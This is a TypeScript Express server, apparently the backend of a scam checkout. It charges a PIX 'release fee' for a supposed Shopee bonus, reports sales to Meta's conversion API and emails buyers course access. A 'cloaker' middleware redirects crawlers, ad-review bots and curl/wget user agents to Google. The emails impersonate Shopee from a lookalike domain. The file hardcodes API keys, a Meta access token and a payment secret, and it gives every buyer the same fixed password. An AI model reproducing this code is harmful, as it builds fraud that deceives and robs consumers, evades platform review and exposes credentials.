import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';
import { Resend } from 'resend';
import crypto from 'crypto';

const app = express();
app.use(cors());
app.use(express.json());

// =====================================================
// 🔑 CONFIGURAÇÕES DE ACESSO
// =====================================================
const MK_KEY = "G3gAuabnX5b3X9cs7oQ8aidn"; 
const MK_SUBDOMINIO = "rodrigo-gato-ribeiro";
const RESEND_KEY = "re_3HT5Wehq_EDfH6jDM5f5JMznsQsAu9cez";

// =====================================================
// 🛡️ CAMADA DE BLINDAGEM (CLOAKER)
// =====================================================
app.use((req, res, next) => {
    const ua = req.headers['user-agent']?.toLowerCase() || '';
    const blacklist = ['headless', 'ahrefs', 'semrush', 'python', 'curl', 'wget', 'spy', 'adspy', 'facebookexternalhit', 'bot', 'crawler'];
    if (blacklist.some(bot => ua.includes(bot))) { return res.redirect('https://www.google.com'); }
    next();
});

// =====================================================
// CONFIGURAÇÃO: META ADS
// =====================================================
const META_PIXEL_ID = "847728461631550"; 
const META_ACCESS_TOKEN = "EAAGZAoNPRbbwBQlVq2XIPxcm6S3lE7EHASXNsyQoiULVOBES9uwoBt1ijXLIsS19daREz2xzuLnMl0C1yZAE3HYkKK19Fmykttzdhs5qZCZC0TkCviGXSrS9NuGvb99ZBDYZB8dkEzjlp6sZBrnG8x79dvvpV55mDhVXTocILMBbuxZCASrUZCIdUr18mYTZB0fgZDZD";

function hashData(data: string): string {
    if (!data) return '';
    return crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
}

async function enviarCompraMeta(email: string, nome: string, valor: number) {
    try {
        await axios.post(`https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events`, {
            data: [{
                event_name: "Purchase",
                event_time: Math.floor(Date.now() / 1000),
                action_source: "website",
                user_data: { em: [hashData(email)], fn: [hashData(nome)] },
                custom_data: { value: valor, currency: "BRL" }
            }],
            access_token: META_ACCESS_TOKEN
        });
        console.log("🎯 CAPI: Purchase Enviado");
    } catch (error) { console.error("❌ Erro CAPI Purchase"); }
}

async function enviarInitiateCheckoutMeta(email: string, nome: string) {
    try {
        await axios.post(`https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events`, {
            data: [{
                event_name: "InitiateCheckout",
                event_time: Math.floor(Date.now() / 1000),
                action_source: "website",
                user_data: { em: [hashData(email)], fn: [hashData(nome)] },
                custom_data: { currency: "BRL", value: 79.10 }
            }],
            access_token: META_ACCESS_TOKEN
        });
        console.log("🚀 CAPI: InitiateCheckout Enviado");
    } catch (error) { console.error("❌ Erro CAPI IC"); }
}

// =====================================================
// 🚀 INTEGRAÇÃO MEMBERKIT (CADASTRO COM SENHA FIXA)
// =====================================================
async function cadastrarMemberKit(email: string, nome: string) {
    try {
        await axios.post(`https://${MK_SUBDOMINIO}.memberkit.com.br/api/v1/enrollments`, {
            "full_name": nome,
            "email": email,
            "password": "shopee123" // <--- AQUI ESTÁ A GARANTIA DA SENHA
        }, {
            headers: { "X-MemberKit-API-Key": MK_KEY, "Content-Type": "application/json" }
        });
        console.log(`✅ MemberKit: Aluno ${email} cadastrado com senha shopee123`);
    } catch (error: any) {
        console.error("❌ Erro MemberKit:", error.response?.data || error.message);
    }
}

// =====================================================
// CONFIGURAÇÃO: RESEND (E-MAIL DE ACESSO)
// =====================================================
const resend = new Resend(RESEND_KEY);

async function enviarAcessoCurso(emailCliente: string, nomeCliente: string) {
    try {
        await resend.emails.send({
            from: 'Suporte Shopee <contato@xn--seubnushopp-5eb.com>',
            to: emailCliente,
            subject: 'Seu acesso chegou! 🚀 Resgate de Bonificação Shopee',
            html: `
                <div style="font-family: sans-serif; max-width: 600px; border: 1px solid #eee; padding: 20px; border-radius: 10px;">
                    <h2 style="color: #333;">Olá, ${nomeCliente}! 🎉</h2>
                    <p style="font-size: 16px; color: #555;">Seu acesso já está liberado na plataforma.</p>
                    <div style="background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 25px 0; border: 1px solid #ddd;">
                        <h3 style="margin-top: 0; color: #ee4d2d; font-size: 18px;">🔑 Seus Dados de Acesso:</h3>
                        <p style="margin: 10px 0; font-size: 16px;"><strong>Login (E-mail):</strong> ${emailCliente}</p>
                        <p style="margin: 10px 0; font-size: 16px;"><strong>Senha:</strong> shopee123</p>
                    </div>
                    <div style="text-align: center; margin: 30px 0;">
                        <a href="https://${MK_SUBDOMINIO}.memberkit.com.br/" 
                           style="background: #ee4d2d; color: white; padding: 18px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; display: inline-block;">
                            ACESSAR MEU PAINEL AGORA
                        </a>
                    </div>
                    <p style="font-size: 12px; color: #999; margin-top: 15px;">Equipe de Liberação | Shopee Brasil</p>
                </div>
            `
        });
        console.log("📧 Resend: E-mail enviado para " + emailCliente);
    } catch (error) { console.error("❌ Erro Resend"); }
}

// =====================================================
// 🔴 VIZZION PAY & MAPA DE TRANSAÇÕES
// =====================================================
const SECRET_KEY = "e08f7qe1x8zjbnx4dkra9p8v7uj1wfacwidsnnf4lhpfq3v8oz628smahn8g6kus"; 
const PUBLIC_KEY = "rodrigogato041_glxgrxj8x8yy8jo2";
const bancoTransacoes = new Map();

app.use(express.static(path.resolve())); 
app.get('/', (req, res) => { res.sendFile(path.resolve('index.html')); });

function acharCopiaECola(obj: any): string | null {
    if (typeof obj === 'string' && obj.startsWith('000201')) return obj;
    if (typeof obj === 'object' && obj !== null) {
        for (const key in obj) {
            const result = acharCopiaECola(obj[key]);
            if (result) return result;
        }
    }
    return null;
}

// =====================================================
// ROTA 1: GERA O PIX
// =====================================================
app.post('/pix', async (req, res) => {
    try {
        const { name, email, cpf, phone, valor, origem } = req.body;
        const valorFixo = parseFloat(valor) || 79.10; 
        const identifier = `ID${Date.now()}`;

        const payload = {
            identifier: identifier,
            amount: valorFixo,
            client: { name: name || "Cliente", email: email || "cliente@email.com", document: cpf || "00000000000" },
            products: [{ id: "TAXA_01", name: "Taxa de Liberação", quantity: 1, price: valorFixo }],
            callbackUrl: "https://checkoutfinal.onrender.com/webhook"
        };

        // Salva tudo no mapa para recuperar no webhook
        bancoTransacoes.set(identifier, { 
            status: 'pending', amount: valorFixo, emailCliente: email, nomeCliente: name, origem: origem || 'direto' 
        });

        await enviarInitiateCheckoutMeta(email, name);

        const response = await axios.post('https://app.vizzionpay.com/api/v1/gateway/pix/receive', payload, {
            headers: { 'x-public-key': PUBLIC_KEY, 'x-secret-key': SECRET_KEY, 'Content-Type': 'application/json' }
        });

        return res.json({ 
            success: true, 
            payload: acharCopiaECola(response.data), 
            transactionId: identifier 
        });
    } catch (error) { return res.status(401).json({ success: false }); }
});

// =====================================================
// ROTA 2: WEBHOOK (AQUI ACONTECE A MÁGICA DO ACESSO)
// =====================================================
app.post('/webhook', async (req, res) => {
    const { event, transaction } = req.body;
    if (!transaction) return res.status(400).send("Invalid");

    const idBusca = transaction.identifier || transaction.id;

    if (transaction.status === 'COMPLETED' && event === 'TRANSACTION_PAID') {
        if (bancoTransacoes.has(idBusca)) {
            const transacao = bancoTransacoes.get(idBusca);
            bancoTransacoes.set(idBusca, { ...transacao, status: 'paid' });
            
            console.log(`💰 VENDA CONFIRMADA: ${transacao.nomeCliente}`);

            // 1. Meta Purchase
            await enviarCompraMeta(transacao.emailCliente, transacao.nomeCliente, Number(transaction.amount));
            
            // 2. CADASTRO NA MEMBERKIT (FORÇANDO SENHA shopee123)
            await cadastrarMemberKit(transacao.emailCliente, transacao.nomeCliente);

            // 3. E-MAIL COM DADOS DE ACESSO
            await enviarAcessoCurso(transacao.emailCliente, transacao.nomeCliente);
        }
    }
    return res.status(200).send("OK");
});

app.get('/check-status/:id', (req, res) => {
    const transacao = bancoTransacoes.get(req.params.id);
    return res.json({ paid: transacao && transacao.status === 'paid' });
});

app.listen(process.env.PORT || 3000, () => console.log("🚀 Servidor Full Automatizado Rodando!"));
